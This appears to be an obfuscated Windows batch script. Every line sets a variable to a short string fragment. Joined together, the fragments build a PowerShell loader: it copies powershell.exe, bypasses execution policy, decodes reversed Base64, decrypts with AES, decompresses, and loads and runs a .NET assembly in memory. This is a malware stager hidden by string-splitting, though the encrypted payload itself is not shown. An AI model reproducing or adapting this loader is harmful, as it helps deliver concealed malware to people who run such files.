@echo off
set "eUHgDowfJI=do"
set "VjRQxBOypW=rs"
set "bxedSgNNrk=s\"
set "qPJaQUipBY=y "
set "lSLkIljTFy=st"
set "hTzTyDbWfH=he"
set "aqiuRTmmYF=ow"
set "MGkMVUZHwv=rS"
set "fnLjrzFrLL=.e"
set "ybkJQqkSOG= C"
set "sTmvLNHWJY=em"
set "eodAWokYPp=ll"
set "LcUAvwMMbC=ws"
set "jKRWPvDQhg=\v"
set "NByXCqNaXh=we"
set "bOCcbaPDNi=Po"
set "zTsAuHlCzn=ll"
set "IxhjmVixYk=po"
set "yRSkgWFCWI=:\"
set "lMaBfIKNQM=nd"
set "neQrainbVf=we"
set "aigsCnLcLJ=1."
set "lZQbvMRrey=Sy"
set "cVhzujLTuG=\W"
set "BroxsFfkbN=Wi"
set "QIWsGTnJrn=0\"
set "UXvGAazgZf=32"
set "GZtOGqsFeD=he"
set "LfweBHabMt=py"
set "gJhccTcEzZ=xe"
set "pQUqcHfqTj= /"
set "XUhSSsMuqH=in"
set "KVxHdkiWaq=co"
set "xIEJahhKHY= %~dp0"
set "CXPvJTFzjp=cd"
set "BaBfdcLDWB=ck($"
set "LEjaUcXGRd=vjR."
set "GWyJKtFyPo=]::C"
set "jEoidbvMqI=Obje"
set "rygeNFlmLN=vjR "
set "pusXmENZAL=3); "
set "TuqFZtGnJd=EfSD"
set "ArOChmQChU=join"
set "NUnOzQWTix=d = "
set "HQLzyEQnni=tem."
set "LNgEXfCevO=);$M"
set "XlBzzGYODG=736u"
set "pjEYrNnObL=pDu "
set "WoDKQuNTds==');"
set "jLZiGJZykP=rtS4"
set "isdDRIhHHp=rofi"
set "iSCoZetuYz=;$Tz"
set "lyojcBjwdR=tsWi"
set "KftvMsWBAy=New-"
set "ibDcKpPJEH=aT.T"
set "EYWJywUIpW=S46e"
set "OcEXgqLfGG=iron"
set "ltdecfXvJH=.Cre"
set "pFpwTXrISO='')("
set "LPKfAEbkfT=($pS"
set "omNTwZtoYN=mENO"
set "iHxctLhUjQ=-joi"
set "FtMueeTiGV=d = "
set "wQAbbopyXG= = ["
set "MrVgSQAyxG=A.Pa"
set "CiYiChDhBk=morF"
set "oOLyugDlRj=.Ass"
set "fRhUQicQhR=saBm"
set "vwwvFnZXPM=[]] "
set "ymAMRYAfIV=gth)"
set "zuNvRXzjcI=..-1"
set "dWplgfGiXy=.IO."
set "fjHAOvWTJD=null"
set "shdBUhPDuH=]::("
set "RmEsSPzVBy=tem."
set "GNhusuPePT=;$lN"
set "ufYtJZwZSx=Secu"
set "faFyxUnwti=tryP"
set "dNpEEegRZs=New-"
set "ygmiCUMZRi=KCpD"
set "scwIdpDYXG=ewLi"
set "inZUukcmAr=Fd);"
set "gelQAoWnYR=[IO."
set "RRdahqPvKG=ypto"
set "WZCfjRYjiD=tem."
set "IkqyNrxUQy=qYNA"
set "TOVVamVSfu=Comp"
set "oewXCCaaIZ=$Kkb"
set "WpCuaDPKJO=;$KC"
set "OGZuwpVjrG=lVt "
set "MojkCOLXnm=[Sys"
set "qmQUMZGWzC=e]::"
set "pBbPSrdhcr=d = "
set "CoZyUmtqHu=ispo"
set "tesIhYuWDk=  $J"
set "SrbxdNtZmJ=-ep "
set "hqdaMadMwz=]::N"
set "qOXRKPATxX=ress"
set "VclRUpWtJY=esaB"
set "KUFaoAcadi=($pS"
set "ZVFNUgLcXn=stem"
set "cuITylkpMj=TllA"
set "aToFVMnBag=qYNA"
set "SQKJHtjRIE='txe"
set "HxoqQnSTnE== [S"
set "RAisapCEnC=oint"
set "HxydyQhAkS=orF'"
set "hwsfzLvMXY=raph"
set "CeMSzKVtSf=m.IO"
set "yfptCnKdNi=NA.I"
set "VNVWovewwA=g = "
set "sHdIiGzGzs=16] "
set "kwDRnaPBwm=aT ="
set "LTowNUDULm=.Mod"
set "CklIibpqMQ=Disp"
set "TDxIvhqSNb=esFX"
set "ZMaAZpAXfN=ose("
set "eyZOBbHKQk=KkbF"
set "trArBeoKUG=pSlV"
set "SCpGEaahwz=m.IO"
set "IkTcHQrFAd=comm"
set "WioMLctLQj=Fd ="
set "CFJlkZHWMr=brea"
set "tRofnfbvxJ=.Cry"
set "IwIBaqoOks=.Dis"
set "QGVxBbAZqc=kbFd"
set "xWXbxEogwm=);$K"
set "CcHtYwgmev=)))"
set "VFsFvEfmEX=EfSD"
set "ebGYqZcdZa=.Con"
set "YQfZhSrvMq=:('g"
set "dmeZntlkEQ=n ''"
set "YDPQryTBBP=-joi"
set "QUjKOfCVVd=ay()"
set "tlFqjIGGlP=aT);"
set "vZqEDFybYz=7Yiv"
set "UpUPghATlI=] -j"
set "OxBVCnEZiu=ptor"
set "uALGEmEzck=d, 0"
set "wlSbmjGqoF=MqYN"
set "NZhiZQpkTV=pher"
set "lpICsmCyzu=..-1"
set "wOMQxsMYCk=NMUE"
set "sjHIcSZhJq=kbFd"
